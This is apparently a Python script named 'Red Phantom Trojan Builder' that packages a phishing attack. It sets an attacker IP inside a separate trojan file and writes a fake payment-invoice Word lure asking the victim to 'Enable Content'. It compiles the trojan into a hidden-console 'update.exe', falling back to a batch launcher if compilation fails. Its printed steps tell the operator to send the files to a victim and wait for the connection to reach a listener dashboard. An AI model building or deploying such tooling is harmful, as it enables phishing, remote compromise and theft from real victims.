import os
import subprocess
import sys
from docx import Document
import socket
import shutil

def get_attacker_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "192.168.100.5"

def build_document():
    print("[*] Red Phantom Trojan Builder")
    print("="*50)
    
    current_dir = os.path.dirname(os.path.abspath(__file__))
    print(f"[*] Current directory: {current_dir}")
    
    project_root = os.path.dirname(os.path.dirname(current_dir))
    output_dir = os.path.join(project_root, "backend", "output_ready_to_send")
    output_dir = os.path.abspath(output_dir)
    
    print(f"[*] Output directory: {output_dir}")
    
    os.makedirs(output_dir, exist_ok=True)
    print(f"[+] Created output directory")
    
    attacker_ip = get_attacker_ip()
    print(f"[+] Using attacker IP: {attacker_ip}")
    
    trojan_path = os.path.join(current_dir, "trojan_reference.py")
    
    if os.path.exists(trojan_path):
        print(f"[*] Found trojan file: {trojan_path}")
        
        with open(trojan_path, 'r', encoding='utf-8') as f:
            trojan_content = f.read()
        
        if 'ATTACKER_IP = "192.168.100.5"' in trojan_content:
            trojan_content = trojan_content.replace(
                'ATTACKER_IP = "192.168.100.5"',
                f'ATTACKER_IP = "{attacker_ip}"'
            )
            
            with open(trojan_path, 'w', encoding='utf-8') as f:
                f.write(trojan_content)
            
            print(f"[+] Trojan IP updated to: {attacker_ip}")
        else:
            print("[-] Could not find IP pattern in trojan file")
    else:
        print(f"[-] Trojan file not found: {trojan_path}")
        return False
    
    print("\n[*] Creating Word document...")
    try:
        doc = Document()
        doc.add_heading('Payment Invoice - Dear Customer', 0)
        doc.add_paragraph(
            "Dear Sir/Madam,\n\n"
            "Please be advised that a final payment invoice for the amount of 1,250 EGP has been issued.\n"
            "For details, please click the 'Enable Content' button at the top of the page.\n\n"
            "Sincerely,\n"
            "Finance Department - Modern Technology Company"
        )
        doc_path = os.path.join(output_dir, "Payment_invoice.docm")
        doc.save(doc_path)
        print(f"[+] Created: Payment_invoice.docm")
    except Exception as e:
        print(f"[-] Error creating Word document: {str(e)}")
        return False
    
    print("\n[*] Building EXE with PyInstaller...")
    
    temp_dirs = [
        os.path.join(current_dir, "build"),
        os.path.join(current_dir, "dist"),
        os.path.join(current_dir, "update.spec"),
        os.path.join(output_dir, "build_temp"),
        os.path.join(output_dir, "dist_temp"),
    ]
    
    for temp_dir in temp_dirs:
        if os.path.exists(temp_dir):
            try:
                if os.path.isdir(temp_dir):
                    shutil.rmtree(temp_dir)
                else:
                    os.remove(temp_dir)
                print(f"[*] Cleaned: {temp_dir}")
            except:
                pass
    
    try:
        print("[*] Attempting to build EXE...")
        
        result = subprocess.run(
            [sys.executable, "-m", "PyInstaller", 
             "--onefile", "--noconsole", "--name", "update",
             trojan_path],
            cwd=current_dir,
            capture_output=True,
            text=True,
            shell=True
        )
        
        print(f"[*] PyInstaller output:\n{result.stdout}")
        
        if result.stderr:
            print(f"[-] PyInstaller errors:\n{result.stderr}")
        
        exe_src = os.path.join(current_dir, "dist", "update.exe")
        exe_dst = os.path.join(output_dir, "update.exe")
        
        if os.path.exists(exe_src):
            shutil.copy2(exe_src, exe_dst)
            print(f"[+] EXE created: update.exe")
            print(f"[*] EXE size: {os.path.getsize(exe_dst) // 1024} KB")
            
            try:
                shutil.rmtree(os.path.join(current_dir, "build"))
                shutil.rmtree(os.path.join(current_dir, "dist"))
                if os.path.exists(os.path.join(current_dir, "update.spec")):
                    os.remove(os.path.join(current_dir, "update.spec"))
                print("[*] Cleaned temporary files")
            except:
                pass
            
        else:
            print("[-] EXE not created by PyInstaller")
            
            print("[*] Creating alternative Python trojan...")
            
            alt_trojan_path = os.path.join(output_dir, "trojan.py")
            shutil.copy2(trojan_path, alt_trojan_path)
            print(f"[+] Created alternative: trojan.py")
            
            bat_content = f'''@echo off
echo Running Trojan...
python "{alt_trojan_path}"
pause
'''
            
            bat_file = os.path.join(output_dir, "run_trojan.bat")
            with open(bat_file, 'w') as f:
                f.write(bat_content)
            print(f"[+] Created: run_trojan.bat")
            
            return True
            
    except Exception as e:
        print(f"[-] Error building EXE: {str(e)}")
        
        try:
            alt_content = f'''print("Trojan for IP: {attacker_ip}")
print("Placeholder EXE - compile manually with PyInstaller")'''
            
            alt_file = os.path.join(output_dir, "trojan_manual.py")
            with open(alt_file, 'w') as f:
                f.write(alt_content)
            print(f"[+] Created manual compilation file: trojan_manual.py")
        except:
            pass
        
        return False
    
    print("\n" + "="*50)
    print("[+] BUILD COMPLETE!")
    print("="*50)
    print(f"\n[*] Files created in: {output_dir}")
    
    if os.path.exists(output_dir):
        files = os.listdir(output_dir)
        print(f"\n[*] Generated files ({len(files)} total):")
        for file in sorted(files):
            file_path = os.path.join(output_dir, file)
            if os.path.isfile(file_path):
                size_kb = os.path.getsize(file_path) // 1024
                print(f"  - {file} ({size_kb} KB)")
    
    print("\n[*] Instructions:")
    print("1. Send Payment_invoice.docm and update.exe to victim")
    print("2. Start listener from dashboard")
    print("3. Victim opens Payment_invoice.docm and enables content")
    print("4. Connection will appear in dashboard")
    print("="*50)
    
    return True

if __name__ == "__main__":
    try:
        success = build_document()
        
        if success:
            print("\n[+] Trojan successfully built!")
            sys.exit(0)
        else:
            print("\n[-] Trojan build failed!")
            sys.exit(1)
    except Exception as e:
        print(f"\n[!] Unexpected error: {str(e)}")
        import traceback
        traceback.print_exc()
        sys.exit(1)